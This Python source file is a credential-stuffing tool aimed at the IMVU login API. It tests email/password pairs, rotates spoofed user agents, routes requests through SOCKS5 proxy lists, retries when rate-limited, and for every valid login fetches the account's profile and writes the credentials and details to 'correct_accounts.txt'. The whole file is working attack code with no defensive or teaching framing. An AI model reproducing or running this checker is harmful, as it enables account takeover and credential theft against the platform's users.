import requests
import json
import random


        ###############
        #   zabbix    #
        ###############

POST_LOGIN_URL = 'https://api.imvu.com/login/' 

users_agents = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.246',
                'Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36',
                'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/601.3.9 (KHTML, like Gecko) Version/9.0.2 Safari/601.3.9',
                'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36'
                'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:15.0) Gecko/20100101 Firefox/15.0.1',
                'Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 7.1.1; G8231 Build/41.2.A.0.219; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0.1; E6653 Build/32.2.A.0.253) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0; HTC One X10 Build/MRA58K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/61.0.3163.98 Mobile Safari/537.36',
                'Mozilla/5.0 (Linux; Android 6.0; HTC One M9 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.98 Mobile Safari/537.3',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/69.0.3497.105 Mobile/15E148 Safari/605.1',
                'Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/13.2b11866 Mobile/16A366 Safari/605.1.15',
                'Mozilla/5.0 (Linux; Android 5.0.2; SAMSUNG SM-T550 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.3 Chrome/38.0.2125.102 Safari/537.36']
 

def ApiFiltering(code, user, passwd, req_post, proxy_ip=None):
    if int(code) == int(201) or int(code) == int(200): 
        # filterig the API return
        get_data = req_post.json()
        filter_id_data = get_data['denormalized']
        key_id = list(filter_id_data.keys())
        get_user_data = filter_id_data[key_id[0]]
        fiter_pre_user_data = get_user_data['data']['user']['id']
        req_user_data = requests.get(fiter_pre_user_data)
        principal_user_info = req_user_data.json(
        )['denormalized'][fiter_pre_user_data]['data']

        # User information
        username = principal_user_info['avatarname']
        gender = principal_user_info['gender']
        member_since = principal_user_info['member_since']
        is_vip = principal_user_info['is_vip']
        is_ap = principal_user_info['is_ap']
        is_staff = principal_user_info['is_staff']

        if gender == 'f':
            gender = 'female'
        elif gender == 'm':
            gender = 'male'
        else:
            gender = 'extraterester'

        # Retults and return
        line_result = f'''
        \n                                  email: {user} | password: {passwd} | avatarname: {username} | gender: {gender} | member_since: {member_since} | is_vip: {is_vip} | is_ap: {is_ap} | is_staff: {is_staff}\n
        '''
        correct_account = open('./in-out/correct_accounts.txt', 'a')
        correct_account.write(line_result)
        correct_account.close
        if proxy_ip != None:
            return code, user, passwd, proxy_ip, 'SUCCESS'
        return code, user, passwd, 'SUCCESS'

    if int(code) == 429:
        correct_account = open('./in-out/retry_429_list.txt', 'a')
        correct_account.write(f'\n{user}:{passwd}\n')
        correct_account.close
        return code, user, passwd
    else:
        if proxy_ip != None:
            return code, user, passwd, proxy_ip
        return code, user, passwd


def imvuClinetApi(user, passwd, proxy=False):
    """[this funcction confirm if user exist and get her data for more information user]

    Args:
        user ([str]): [user id account or email]
        passwd ([str]): [user password]

    Returns:
        [str]: [if te user exits or not]
        [file_write]: [write in a txt file if user exits the detalied user information]
    """
    payload = {
        'data': {'username': user, 'password': passwd, 'gdpr_cookie_acceptance': False},

        'headers': {'Accept': '*/*',
                    'Content-Type': 'application/json',
                    'User-Agent': random.sample(users_agents, 1)[0],
                    'https': '//secure.imvu.com/welcome/ftux/'
                    }
    }
    if proxy == False:
        req_post = requests.post(POST_LOGIN_URL, data=json.dumps(
            payload.get('data')), headers=payload.get('headers'), timeout=5)

        code = req_post.status_code

        return ApiFiltering(code, user, passwd, req_post)

    if proxy == True:
        with open(f'./in-out/proxy_list.txt', 'r',  encoding='utf-8') as f:
            proxy_list = f.readlines()

        for proxies in proxy_list:
            proxy_dict = {
                'http': f'socks5://{proxies}',
                'https': f'socks5://{proxies}'}
            try:
                req_post = requests.post(POST_LOGIN_URL, data=json.dumps(
                    payload.get('data')), headers=payload.get('headers'), proxies=proxy_dict, timeout=3)
                code = req_post.status_code

                if int(code) == 429:
                    print('code:429 auto-retry is actived on proxy mode')
                else:
                    return ApiFiltering(code, user, passwd, req_post, proxies)
                    break
            except:
                except_var = None
